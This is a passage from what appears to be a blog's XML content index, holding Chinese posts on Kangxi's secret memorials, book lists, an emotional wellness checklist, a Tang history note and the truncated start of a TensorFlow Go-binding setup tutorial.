曹寅密折(朱批)：朕无可以托人打听，尔等受恩深重，但有所闻，可以亲手书折奏闻才好。此话断不可以叫人知道，若有人知，尔即招祸矣！ 密折案例从现存资料来看，内务府江宁织造、苏州织造的密奏内容集中在四个方面：农业、高级官员、匪盗和社会舆论情况。 例如,1693 年李煦在请安折上汇报了江南地区的米市行情: 干旱缓解，米价平稳，粗米七钱，细白好米一两。 朱批：但有南来者，必问详情，闻尔所奏，少解宵旰之劳。秋收之后，还写奏帖奏来。凡有奏帖，万不可与人知道。 康熙四十八年朱批：熊赐履近况如何？ （熊赐履，1635年－1709年，顺治十五年进士，康熙朝历任翰林学士、武英殿大学士、礼部尚书、吏部尚书，康熙四十二年致仕）。 曹寅：打听得熊赐履在家，不曾远出。其同城各官有司往拜者，并不接见。近日与江宁一二秀才陈武循、张纯及鸡鸣寺僧，看花作诗，有小桃园杂咏二十四首，此其刊刻流布在外者，谨呈御览。因其不与交游，不能知其底蕴。谨据所得实奏。 曹寅：臣细探得熊赐履湖广原籍有祖遗住房一所，田不足百亩，江宁现有大住房一所，田一百余亩，江楚两地房田价值约可七八千两。…… 熊赐履在日未闻共向人借贷之事。其间或有门生故吏周济，或地方来往官员赠贻，故过日充裕，较之汉官大臣内，亦属中等过活，未见甚贫。 短短几句就包含了一位退休高官的日常活动、社会往来的大量细节，可以算是一份古代版的信用报告了（“看花”一词可能是寻花问柳的一种委婉说法）。要知道，熊赐履可是康熙实际上的老师，此时已是将死之人，窥探如此，何况他人乎。 康熙尤其关注江南的市井流言、社会舆情。 朱批：近日闻得南方有许多闲言，无中生有，议论大小事。 曹寅密奏：江宁洪武陵冢上西北角梧桐树下陷蹋一窟，口面有五尺余寸，深约二丈余，下视如井…… 民间讹言冢已塌下，臣随往勘验，离地宫尚远十五丈余，毫不相关，原系当先培填之土不坚，日久值雨冲蹋，水流宝城之外。当有地方该管官员，即命陵户挑土填平。恐谣言流播，讹传失实，合先奏闻。 朱批：知道了。此事奏闻的是，尔再打听，还有甚么闲话，写折来奏。 总结康熙为了查核常规的官僚体系，需要纯属私人的消息来源。织造官员由于其内务府包衣的特殊出身（皇家专属奴仆）、与皇帝亲密的个人关系、与地方官员和商人的广泛联系，有助于提供广泛的准确情报，为诸多决策提供依据，可以说是康熙皇帝治理体系的重要组成部分。诚如他自己所言： 朕临莅天下五十余年，遍谙诸事，于满洲、蒙古、汉军、汉人，毫无异视 …… 阅朕此旨，是则是，非则非。 帝国庞大的秘密情报系统中，包括曹寅等人在内，似乎很乐意从事这一工作，他们感觉到自己与天子的接触直接且非常私人，他们将用更诚挚、更真心的效忠回报皇帝的知遇和信任。但是这种高度私人化关系，在改朝换代之后就显得不那么美妙了。 扩展阅读 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 雍正《大义觉迷录》 史景迁|《康熙与曹寅》 孔飞力|《叫魂》 参考文献]]></content>
      <tags>
        <tag>History</tag>
        <tag>Art</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数学工具指南]]></title>
    <url>%2F2018%2F02%2F02%2FMathmetics-Tools%2F</url>
    <content type="text"><![CDATA[摘要 公式排版（LaTeX） 公式图形化（GeoGebra） 公式排版（LaTeX） LaTeX macOS 矢量作图小贴士 Tips 分数线分割的式子字体缩小问题&amp;积分号太短的问题:将表达式中的\frac换成\dfrac即可，这里的d的意思是displaystyle 公式图形化（GeoGebra） Geogebra Bomb250@从gnuplot到GeoGebra的艰难之旅 参考文献]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Economist-International-Relation]]></title>
    <url>%2F2018%2F02%2F01%2FEconomist-International-Relation%2F</url>
    <content type="text"><![CDATA[摘要 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 参考]]></content>
  </entry>
  <entry>
    <title><![CDATA[The Economist 2017年度推荐书单]]></title>
    <url>%2F2018%2F01%2F30%2FEconomist-Books-Year-2017%2F</url>
    <content type="text"><![CDATA[摘要 The Economist:Books of the Year 2017 The Economist:Books of the Year 2016 Books of the Year 2017The best books of 2017 are about music, nicotine and the tsunami in Japan Dec 9th 2017 The Retreat of Western Liberalism. By Edward Luce. Grove Atlantic; 234 pages; $24. Little Brown; £16.99Few doubt that something big has happened in Western politics over the past two years, but nobody is sure what. Turmoil in Washington and London contrasts with centrist stability in Paris and (mostly) in Berlin. In this grim diagnosis Edward Luce, a Washington-based commentator, argues that the liberal order cannot be fixed without a clear view of what has gone wrong. Refuge: Transforming a Broken Refugee System. By Alexander Betts and Paul Collier. Oxford University Press; 288 pages; $18.95. Allen Lane; £20Lost in the row over Europe’s migration crisis in 2015 were the millions of refugees who stayed in the developing world, unwilling or unable to journey to richer countries. Growing up in a refugee camp often means little education and no work. Two experts at Oxford University present the first comprehensive attempt in years to rethink from first principles a system that has long been hidebound by hand-wringing and old ideas. The Road to Somewhere: The Populist Revolt and the Future of Politics. By David Goodhart. Hurst; 278 pages; $24.95 and £20“Somewheres”, David Goodhart writes, are rooted, socially conservative and suspicious of the constant churn. By contrast, “Anywheres” are cosmopolitan, socially liberal, internationalist and comfortable with change. In creating a new political taxonomy, the British journalist and founder of Prospect magazine provides a useful way to think about new cleavages in Britain and elsewhere in the West. Its influence is visible everywhere. Ghosts of the Tsunami: Death and Life in Japan’s Disaster Zone. By Richard Lloyd Parry. Farrar, Straus and Giroux; 276 pages; $27. Jonathan Cape; £16.99Of the 18,500 people who perished in the Japanese tsunami in 2011, 75 were children who died at school. But a single school accounted for 74 of those deaths. This mesmerising account of the 120-foot-high wave and its aftermath, by the Asia editor and Tokyo bureau chief of the Times, explores the uncharacteristicly fierce reaction of the dead children’s parents to official evasion. In the process it tells you more about Japan than any conventional history. The finest work of narrative non-fiction to be published this year. Biography and memoirGrant. By Ron Chernow. Penguin Press; 1,104 pages; $40. Head of Zeus; £30The historian who inspired “Hamilton”, Lin-Manuel Miranda’s hit musical, argues that America’s most improbable president has been badly misunderstood. Instead of being seen as the overlord of a corrupt administration (though it never touched him personally), he should be lauded for the integration of the union after the civil war and his insistence on naming blacks, Jews and native Americans to federal positions. The Undoing Project: A Friendship that Changed Our Minds. By Michael Lewis. W.W. Norton; 362 pages; $28.95. Allen Lane; £25A fascinating intellectual biography of the Israeli psychologists Daniel Kahneman and Amos Tversky, two very different men whose work at the intersection of psychology and economics grows more influential by the year. Ali: A Life. By Jonathan Eig. Houghton Mifflin Harcourt; 630 pages; $30. Simon &amp; Schuster; £25Muhammad Ali often claimed to be the greatest boxer of all time, and he was right. Only a handful of athletes reach the pinnacle of their discipline; he was the only one who threw it all away to do what was unpopular but principled. A fine account of why, when Ali died, he was remembered not only as boxing’s most decorated and enthralling heavyweight, but also for his refusal to serve in the Vietnam war as a rebellion against white supremacy. The Dawn Watch: Joseph Conrad in a Global World. By Maya Jasanoff. Penguin Press; 400 pages; $30. William Collins; £25Brought up speaking Polish and French, Jozef Teodor Konrad Korzeniowski did not learn English until he was 21. But as Joseph Conrad he became one of the finest English writers. “Heart of Darkness” is his most famous book. More important, as Maya Jasanoff shows so well, he was the first novelist of globalisation. Chief Engineer: Washington Roebling, the Man Who Built the Brooklyn Bridge. By Erica Wagner. Bloomsbury; 365 pages; $28 and £25A biography about connections and disconnections—about the man who built what, at the time of its opening, was the longest suspension bridge in the world. Roebling also fought all his life to emerge from the shadow of a cold and domineering father. A masterful psychological study about duty and drive. Toscanini. By Harvey Sachs. W.W. Norton; 944 pages; $39.95 and £29.99Drawing on a wide range of new evidence, including unknown letters and the archives of many of the opera houses that Arturo Toscanini worked with, including La Scala, Harvey Sachs has written a weighty and highly enjoyable account of one of the greatest conductors, a man still renowned for his pursuit of perfection. Anthony Powell: Dancing to the Music of Time. By Hilary Spurling. Hamish Hamilton; 528 pages; £25Anthony Powell came from a brilliant generation of English writers, including George Orwell, Evelyn Waugh and Graham Greene—yet he may now be the least read of them all. Hilary Spurling’s long-awaited life of one of Britain’s most perceptive novelists of class, best known for the 12-volume “Dance to the Music of Time”, is an exemplary literary biography. On virtually every page it is colourful, funny and pointedly aphoristic. The Hate Race: A Memoir. By Maxine Beneba Clarke. Corsair; 261 pages; £18.99The child of Jamaican/Guyanese parents who left Britain for Australia writes the book she wished she had been able to read when she was growing up in the Sydney suburbs, where “racism was as common as cornflakes”. A bestseller when it first came out in Australia, it deserves to be more widely read. Fall Down 7 Times Get Up 8. By Naoki Higashida. Random House; 206 pages; $27. Sceptre; £14.99An unorthodox guide by a young Japanese man, who at 13 wrote a heartfelt account of how it feels like to be autistic. David Mitchell, an English novelist, and his wife, Keiko Yoshida, translated the text for their autistic son’s carers and helped get the book published in over 30 languages, making Mr Higashida probably the most widely read Japanese author after the master-novelist, Haruki Murakami. HistoryRed Famine: Stalin’s War on Ukraine. By Anne Applebaum. Doubleday; 496 pages; $35. Allen Lane; £25A meticulously researched analysis proving that the famine in Soviet Ukraine in the 1930s was part of a deliberate campaign by Josef Stalin and the Bolshevik leadership to crush Ukrainian political aspirations by starving the actual or potential nationalists into submission to the Soviet order. The Internationalists: How a Radical Plan to Outlaw War Remade the World. By Oona Hathaway and Scott Shapiro. Simon &amp; Schuster; 608 pages; $30. Allen Lane; £30The post-war liberal order was underpinned by a movement to make the waging of aggressive war illegal. Two American academics argue that this principle is now seriously under threat. The Unwomanly Face of War. By Svetlana Alexievich. Random House; 384 pages; $30. Penguin Modern Classics; £12.99An oral history, first published in 1985 but only now translated into English, as told by women who enlisted in the Soviet army straight from school, learning to kill and die before they learned to live or give life. By one of the most gifted writers of her generation. Six Minutes in May: How Churchill Unexpectedly Became Prime Minister. By Nicholas Shakespeare. Harvill Secker; 528 pages; £20It is hard to imagine Britain without the jowly Winston Churchill at the helm during the second world war. Yet in May 1940 Neville Chamberlain’s government, with its majority of 213, seemed virtually unassailable. An eloquent study in how quickly the political landscape can change—and history with it. Enemies and Neighbours: Arabs and Jews in Palestine and Israel, 1917-2017. By Ian Black. Atlantic Monthly Press; 608 pages; $30. Allen Lane; £25A well-known British journalist offers a detailed account of how the Israelis and Palestinians are still haunted by their history. The Balfour Declaration was just the start of it. Belonging: The Story of the Jews, 1492-1900. By Simon Schama. Ecco; 800 pages; $39.99. Bodley Head; £25The story of the Jews between 1492 and 1900, told as a series of vivid biographies. In the hands of a master colourist, this is history as a portrait gallery. Roll on the final volume in the series. The House of Government: A Saga of the Russian Revolution. By Yuri Slezkine. Princeton University Press; 1,128 pages; $39.95 and £29.95The remarkable tale of an enormous block of flats that served as home to communism’s true believers. A story that is as Russian in scope as it is symbolic of what Russia and the Russian revolution eventually became. Against the Grain. By James Scott. Yale University Press; 336 pages; $26 and £20An interesting summation of recent research into why the first states did not develop until a long time after humans stopped being nomads and agriculture had become the norm. Economics and businessThe Great Leveller: Violence and the History of Inequality from the Stone Age to the Twenty-First Century. By Walter Scheidel. Princeton University Press; 528 pages; $35 and £27.95An Austrian-born historian, now at Stanford University, argues that only catastrophic events really reduce inequality. Depressing and convincing. Capitalism without Capital: The Rise of the Intangible Economy. By Jonathan Haskel and Stian Westlake. Princeton University Press; 288 pages; $29.95 and £24.95Businesses in rich countries are increasingly investing in “intangible” assets, including research and development, branding and public relations, and less in “tangible” ones, such as machinery. The growing importance of intangible assets plays a part in some of the big trends that are gripping rich economies, from rising income inequality to weak growth in productivity. Black Edge: Inside Information, Dirty Money and the Quest to Bring Down the Most Wanted Man on Wall Street. By Sheelah Kolhatkar. Random House; 344 pages; $28The rise, fall and rise of Steven Cohen—a brief history of SAC Capital and how its boss inspired Bobby Axelrod of “Billions”. Janesville: An American Story. By Amy Goldstein. Simon &amp; Schuster; 368 pages; $27 and £18.99The riveting story of what happened to a company town and the families who lived and worked there when General Motors decided to shut down its assembly plant in a city in southern Wisconsin. Americana: A 400-Year History of American Capitalism. By Bhu Srinivasan. Penguin Press; 576 pages; $30A delightful tour through the businesses and industries that turned America into the world’s biggest economy—by a hard-working immigrant who himself became an entrepreneur. A paean to progress. Clashing over Commerce: A History of US Trade Policy. By Douglas Irwin. University of Chicago Press; 832 pages; $35Trade-policy wonks are gluttons for punishment. In good times, their pet topic is dismissed as dull. In bad, they find trade being faulted for everything. A Dartmouth College professor sets the record straight, and in the process elegantly debunks a host of trade-policy myths. CultureThe Souls of China: The Return of Religion after Mao. By Ian Johnson. Pantheon; 448 pages; $30. Allen Lane; £25As ordinary people (and party leaders) are trying to workout what it means to be Chinese in the modern world, a Canadian- born academic shows how a resurgence of faith is quietly changing the country. Dream Hoarders: How the American Middle Class is Leaving Everyone Else in the Dust, Why That Is a Problem, and What to Do About It. By Richard Reeves. Brookings Institution Press; 196 pages; $24Which of America’s social fault-lines is the most dangerous? Race? Culture? Wealth? This last offers part of an answer. Having grabbed their piece of prosperity, the upper-middle class are fighting to keep it. A British scholar, based in New York, argues in detail why it is this 10%—rather than the 1% of lore—who are the main beneficiaries (and the principal cause) of inequality in America. Everybody Lies: Big Data, New Data, and What the Internet Can Tell Us About Who We Really Are. By Seth Stephens-Davidowitz. Dey Street; 288 pages; $27.99. Bloomsbury; £20Big data, says Seth Stephens-Davidowitz, a former data scientist for Google, provides new sources of information. It captures what people actually do or think, rather than what they choose to tell pollsters; it helps researchers home in on and compare demographic or geographical subsets; and it allows for super fast randomised controlled trials. This book argues that the web will revolutionise social science just as the microscope and telescope transformed the natural sciences. The Sum of Small Things: A Theory of the Aspirational Class. By Elizabeth Currid- Halkett. Princeton University Press; 254 pages; $29.95 and £24.95Rather than filling their garages with flashy cars, today’s rich devote their budgets to less visible but more valuable ends: education, domestic services and cultural capital. A professor at the University of Southern California shows why it is so difficult to stop the privileged position of the elites becoming more entrenched. Nicotine. By Gregor Hens. Translated by Jen Calleja. Other Press; 176 pages; $16.95. Fitzcarraldo Editions; £12.99Cigarettes function as punctuation for life, argues Gregor Hens, a German author and translator. They make it coherent and add drama, inserting commas, semi-colons and ellipses (and, in the end, an inarguable and often premature full stop). Smoking is bad for you, but that doesn’t mean it can’t be fun. The Novel of the Century: The Extraordinary Adventure of “Les Miserables”. By David Bellos. Farrah, Straus and Giroux; 336 pages; $27. Particular Books; £20From the humane treatment of ex-offenders to the care of street children Victor Hugo’s epic novel, “Les Misérables”, spearheaded calls for reform and contributed to “the future improvement of society”. Few books really change the world. This one did, long before the musical broke box office records. Science and technologyInheritors of the Earth: How Nature is Thriving in an Age of Extinction. By Chris Thomas. PublicAffairs; 320 pages; $28. Allen Lane; £20Humans have consigned species to extinction at an alarming rate. But hybridisation and speciation is happening quickly, too. An ecologist at the University of York shows how humans are bringing about a great new age of biological diversity. Extinctions ain’t what they used to be. Dawn of the New Everything. By Jaron Lanier. Henry Holt; 351pages; $30. Bodley Head; £20An eccentric, but visionary, tech pioneer recalls a life spent in virtual reality and reflects on the growing hubris of Silicon Valley. Tamed: Ten Species that Changed our World. By Alice Roberts. Hutchinson; 368 pages; £20For lovers of “Guns, Germs and Steel” and “Sapiens” comes a new, deceptively simple book. Alice Roberts, an anatomist and palaeopathologist, uses the story of how apples, cattle, dogs, horses and rice came to be domesticated to tell a wider story about humans’ long history. FictionLincoln in the Bardo. By George Saunders. Random House; 368 pages; $28. Bloomsbury; £18.99Abraham Lincoln’s son dies young and enters a multi-chorus Buddhistic underworld. One of the year’s most original and electrifying novels. White Tears. By Hari Kunzru. Knopf; 288 pages; $26.95. Hamish Hamilton; £14.99A Londoner now living in New York, Hari Kunzru introduces two unforgettable characters to illustrate how black music came to be imbued with the spirit of the blues. His imagery resonates with the racial politics of modern life. Austral. By Paul McAuley. Gollancz; 288 pages; £14.99A chase thriller set in late 21st-century Antarctica that combines elements of Jack London, J.G. Ballard and William Gibson. A significant contribution to writing about the anthropocene. The Seventh Function of Language. By Laurent Binet. Translated by Sam Taylor. Farrar, Straus and Giroux; 368 pages; $27. Harvill Secker; £16.99A conspiracy thriller about the death of the French literary theorist, Roland Barthes, that draws on the work of Jacques Derrida and Dan Brown with tongue firmly in cheek—to hilarious effect. The Golden Legend. By Nadeem Aslam. Knopf; 319 pages; $27.95. Faber &amp; Faber; £16.99Too much political exposition can be the death of fiction. Not so here. In his fifth novel, a British-Pakistani writer offers a richly imagined lesson in how to make great literature out of despotism. Stay with Me. By Ayobami Adebayo. Knopf; 272 pages; $25.95. Canongate Books; £14.99A gut-wrenching tale of how wanting a child can wreck a woman, a marriage and a community. Only 29, Ayobami Adebayo is surely a writer to watch. Exit West. By Mohsin Hamid. Riverhead; 240 pages; $26. Hamish Hamilton; £14.99A sharply pointed story about migration that came within a whisker of winning the 2017 Man Booker prize for fiction. The author of “The Reluctant Fundamentalist” has written another novel of our time. Fever Dream. By Samanta Schweblin. Translated by Megan McDowell. Riverhead; 192 pages; $25. OneWorld; £7.99A slim novel about environmental disaster and the outer limits of love. Subtle, dreamy and indelibly creepy. Compass. By Mathias Enard. Translated by Charlotte Mandell. New Directions; 464 pages; $26.95. Fitzcarraldo Editions; £14.99Over one night a French scholar muses on the differences between West and East. The winner of the 2015 Prix Goncourt on love, longing and otherness.]]></content>
      <tags>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:机器学习推荐书单]]></title>
    <url>%2F2018%2F01%2F25%2FMachine-Learning-Books%2F</url>
    <content type="text"><![CDATA[摘要 Background 统计学 | Statistics Machine learning Deep learning Background 吴军|《数学之美》 《黑客与画家》 统计学 | Statistics An Introduction to Statistical Learning with Applications in R The Elements of Statistical Learning:Data Mining, Inference, and Prediction. Statistical Computing for Scientists and Engineers | University of Notre Dame, Fall 2017 Probability Theory (For Scientists and Engineers) Michael Betancourt | April 2018 课程 | 深度学习 UC Berkeley CS 294深度强化学习课程（附视频与PPT）(Eng) 推荐书单 《深度学习》|原作名: Deep Learning: Adaptive Computation and Machine Learning series 《机器学习导论（原书第3版）》 《Deep Learning》| Josh Patterson 《概率编程实战》 《Hands-On Machine Learning with Scikit-Learn and TensorFlow》 《Machine Learning in Action | 机器学习实战》 中译 python-lang English Building a Neural Net from Scratch in Go | Daniel Whitenack TensorFlow 谷歌云官方：一小时掌握深度学习和 TensorFlow（视频+50PPT）2017-01-24 新智元 Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 统计建模与机器学习的区别:Oliver Schabenberger是商业分析与商业智能软件SAS的副总裁，Analytic Server的研发主管，他还是美国统计协会ASA的会士。]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[医学常识|情绪健康检查表]]></title>
    <url>%2F2018%2F01%2F22%2FHealth-Emotional%2F</url>
    <content type="text"><![CDATA[摘要 情绪健康检查表 Emotional Wellness Checklist This article is part of an Work Life Balance tutorial series. Make sure to check out my other articles as well: IT 工程师养生指南 医学常识| NIH 情绪健康检查单 Preview How Helping Others Can Relieve Anxiety and Depression |New research shows one more way that compassion is beneficial.|Posted Oct 10, 2017compassionate goals were associated with lower levels of symptoms and less relationship conflict. 情绪健康检查表 Emotional wellness is the ability to successfully handle life’s stresses and adapt to change and difficult times. 情绪健康是成功地处理生活压力和适应变化和困难时期的能力。 前景乐观专家说，情绪健康的人消极情绪少，能更快地从困难中恢复过来。这种品质叫做弹性（ resilience ）。情绪健康的另一个标志是能够持久保持积极情绪、欣赏美好时光。 培养更积极的心态： 记住你的善行。 原谅你自己。 多花点时间和朋友在一起。 探索你对人生意义和人生目标的信念。 养成健康的生活习惯。 减少压力每个人都不时感到压力。压力会在你最需要的时候给你一股能量。但是，如果压力持续很长一段时间被称为慢性应激，“高度警惕”的变化变得有害无益。学习应对压力的方法也能增强你的韧性。 管理你的压力: 充足的睡眠。 经常锻炼。 建立一个社会支持网络。 设置优先级。 积极思考。 尝试放松。 寻求帮助。 提高睡眠质量为了完成我们今天想做的每一件事，我们经常牺牲睡眠。但是睡眠对身心健康都有影响。这一点对你的幸福至关重要。当你处于疲劳状态的时候不能发挥最佳效能。睡眠有助于你更清晰地思考，更快的反应和更好的集中注意力。采取措施确保你有规律的睡个好觉。 获得更好的睡眠质量： 每天按时上床睡觉 &amp; 起床。 在黑暗、安静的地方睡觉。 每天锻炼。 限制使用电子产品。 睡前放松。 避免在白天晚些时候饮酒、吸烟和刺激物质。 如果你有持续的睡眠问题请咨询健康专家。 正念正念的概念很简单。这个古老的实践是关于完全意识到正在发生的一切，内在的一切和周围发生的一切。这意味着不要把生活当成“自动驾驶”，成为一个更加用心的人需要承诺和实践。下面是一些帮助你入门的技巧。 To be more mindful： 用鼻子深呼吸，数到4，保持1秒钟，然后通过嘴呼气数到5。经常重复。 漫步，留心、欣赏周围的风景。 练习正念饮食。用心去体会对食物的渴望，进食时身体的感觉。 在你的本地社区找到正念资源，包括课程、计划或书籍。 应对亲人/爱人逝去当你所爱的人死了，你的世界就会改变。没有绝对正确或错误的悼念方式。虽然亲人的去世会让人感到难以忍受，但大多数人都能在家人和朋友的支持下度过悲痛的过程。学习一些健康的方法帮助你度过困难时期。 以下措施有助于应对爱人逝去： 照顾好自己。 和一个关心你的朋友谈谈。 不要马上做任何重大的改变。 加入悲伤支持小组。 考虑专业支持。 如果你在日常活动中遇到困难，可以和你的医生谈谈。 耐心点。度过悲痛需要时间。 加强社会联系社会关系可能有助于保护健康和延长寿命。科学家们发现，我们与他人的联系可以对我们的身心健康产生强大的影响。无论是与浪漫的伴侣、家人、朋友、邻居或其他人，社会关系都会影响我们的生物和幸福。 构建健康的社会支持系统： 与你的孩子建立牢固的关系。 积极行动建立与家人和朋友分享的良好习惯。 如果你是家庭照顾者，学会向别人寻求帮助。 加入一个专注于自己喜爱的爱好的团体，如阅读、远足或绘画。 加入一个课程，学点新东西。 在社区里做一些你关心的事情，比如社区花园、学校、图书馆或礼拜场所。 到不同的地方去结识新朋友。 Emotional Wellness ChecklistBRIGHTEN YOUR OUTLOOKPeople who are emotionally well, experts say, have fewer negative emotions and are able to bounce back from difficulties faster. This quality is called resilience. Another sign of emotional wellness is being able to hold onto positive emotions longer and appreciate the good times. To develop a more positive mindset: Remember your good deeds. Forgive yourself. Spend more time with your friends. Explore your beliefs about the meaning and purpose of life. Develop healthy physical habits. REDUCE STRESSEveryone feels stressed from time to time. Stress can give you a rush of energy when it’s needed most. But if stress lasts a long time—a condition known as chronic stress—those “high alert” changes become harmful rather than helpful. Learning healthy ways to cope with stress can also boost your resilience. To help manage your stress Get enough sleep. Exercise regularly. Build a social support network. Set priorities. Think positive. Try relaxation methods. Seek help. GET QUALITY SLEEPTo fit in everything we want to do in our day, we often sacrifice sleep. But sleep affects both mental and physical health. It’s vital to your well-being. When you’re tired, you can’t function at your best. Sleep helps you think more clearly, have quicker reflexes and focus better. Take steps to make sure you regularly get a good night’s sleep. To get better quality sleep: Go to bed and get up each day at the same time. Sleep in a dark, quiet place. Exercise daily. Limit the use of electronics. Relax before bedtime. Avoid alcohol, nicotine, &amp; stimulants late in the day. Consult a health care professional if you have ongoing sleep problems. BE MINDFULThe concept of mindfulness is simple. This ancient practice is about being completely aware of what’s happening in the present—of all that’s going on inside and all that’s happening around you. It means not living your life on “autopilot.” Becoming a more mindful person requires commitment and practice. Here are some tips to help you get started. To be more mindful: Take some deep breaths in through your nose to a count of 4, hold for 1 second and then exhale through the mouth to a count of 5. Repeat often. Enjoy a stroll and notice the sights around you. Practice mindful eating. Be aware of each bite and when you’re full. Find mindfulness resources in your local community, including classes, programs, or books. COPE WITH LOSSWhen someone you love dies, your world changes. There is no right or wrong way to mourn. Although the death of a loved one can feel overwhelming, most people can make it through the grieving process with the support of family and friends. Learn healthy ways to help you through difficult times. To help cope with loss: Take care of yourself. Talk to a caring friend. Try not to make any major changes right away. Join a grief support group. Consider professional support. Talk to your doctor if you’re having trouble with everyday activities. Be patient. Mourning takes time. STRENGTHEN SOCIAL CONNECTIONSSocial connections might help protect health and lengthen life. Scientists are finding that our links to others can have powerful effects on our health—both emotionally and physically. Whether with romantic partners, family, friends, neighbors, or others, social connections can influence our biology and well-being. To build healthy support systems: Build strong relationships with your kids. Get active and share good habits with family and friends. If you’re a family caregiver, ask for help from others. Join a group focused on a favorite hobby, such as reading, hiking, or painting. Take a class to learn something new. Volunteer for things you care about in your community, like a community garden, school, library, or place of worship. Travel to different places and meet new people. 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)医学常识| NIH 情绪健康检查单参考文献 Emotional Wellness Toolkit]]></content>
      <tags>
        <tag>Science</tag>
        <tag>Health</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[History-Tang-DiRenjie]]></title>
    <url>%2F2018%2F01%2F17%2FHistory-Tang-DiRenjie%2F</url>
    <content type="text"><![CDATA[摘要 《神探狄仁杰》台词鉴赏 《神探狄仁杰》· 第一部 · 幽州案 自三皇治世、五帝分伦，帝者，以牧养生民为社稷，当体上天好生之德，循加万物；君明则臣举，朝野同心矣。幽州者，朝之上州，内治生民而外御诸夷，无能轻觑，吏治尤为重焉。 ——《资治通鉴·唐纪二十三·卷第二百七》太后信重内史梁文惠公狄仁杰，群臣莫及，常谓之国老而不名。太后尝问仁杰：“朕欲得一佳士用之，谁可者？”仁杰曰：“未审陛下欲何所用之?”太后曰：“欲用为将相。”仁杰对曰：“文学蕴藉，则苏味道、李峤固其选矣。必欲取其卓荦奇才，则有荆州长史张柬之，其人虽老，宰相才也。”太后擢张柬之为洛州司马。数日，又问仁杰，对曰：“前荐柬之，尚未用也。”太后曰：“已迁矣。”对曰：“臣所荐者可为宰相，非司马也。” 乃迁秋官侍郎；久之，卒用为相。 仁杰又尝荐夏官侍郎姚元崇、监察御史曲阿桓彦范、太州刺史敬晖等数十人，率为名臣。或谓仁杰曰：“天下桃李，悉在公门矣。”仁杰曰：“荐贤为国，非为私也。” 参考文献]]></content>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别]]></title>
    <url>%2F2018%2F01%2F17%2FMachine-Learning-TensorFlow%2F</url>
    <content type="text"><![CDATA[摘要 Machine Learning Workflow Problem: 宠物分类、勋章识别、美女打分 Demo: Hello TensorFlow ! TensorFlow C library / Go binding Machine Learning Workflow Define the problem. What problems do you want to solve? Start simple. Be familiar with the data and the baseline results. Then try something more complicated. Problem人类喜欢将所有事物都纳入鄙视链的范畴，宠物当然也不例外。一般来说，拥有一只纯种宠物可以让主人占据鄙视链的云端，进而鄙视那些混血或者流浪宠物。甚至还发展出了专业的鉴定机构，可以颁发《血统证明书》。但是考究各类纯种鉴定的常规方法，主要标准是眼睛的大小、颜色、鼻子的特点、身躯长度、尾巴特征、毛发等特征，当然也包括一些比较玄幻的属性，例如宠物家族的个性、气质等等。 外军研究：美军授勋及嘉奖制度观察一文中提到，世界各国军队都有自己的制服、军衔、勋章体系，它们既是军人荣誉的体现，也包含了丰富的职业信息。但是体系过于庞大也会带来识别困难，例如下图中的两位美军士兵，是否可以有一种方案可以自动、准确地识别各类徽章的意义呢？ 中文网络上有一个特殊名词：颜值。通常用来表示人物颜容英俊或靓丽的数值。人们希望有一个衡量标准可以用来评价、测量和比较人物容貌，许多社交软件甚至可以利用计算机视觉识别技术分析颜值、年龄、性别，甚至与好友一起进行颜值 PK ，当然这些软件的 “颜值” 算法总是备受争议。 哪种类型算是中国式标准美女？ 其实以上三种场景本质上都是图像识别，可以概括为一种基于外观的分类（或者说“打分”）需求，接下来我试图基于机器学习的方法来解决这些问题。 Demo: Hello TensorFlow ! Tensorflow is not a Machine Learning specific library, instead, is a general purpose computation library that represents computations with graphs. TensorFlow 开源软件库（Apache 2.0 许可证），最初由 Google Brain 团队开发。TensorFlow 提供了一系列算法模型和编程接口，让我们可以快速构建一个基于机器学习的智能服务。对于开发者来说，目前有四种编程接口可供选择： C++ source code: Tensorflow 核心基于 C++ 编写，支持从高到低各个层级的操作; Python bindings &amp; Python library: 对标 C++ 实现，支持 Python 调用 C++ 函数; Java bindings; Go binding; 下面是一个简单的实例： 环境准备 安装 TensorFlow C library,包含一个头文件 c_api.h 和 libtensorflow.so 123456789101112wget https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-cpu-linux-x86_64-1.5.0.tar.gz## options# Change to "gpu" for GPU supportTF_TYPE="cpu"TF_VERSION='1.5.0'curl -L \ "https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-$&#123;TF_TYPE&#125;-$(go env 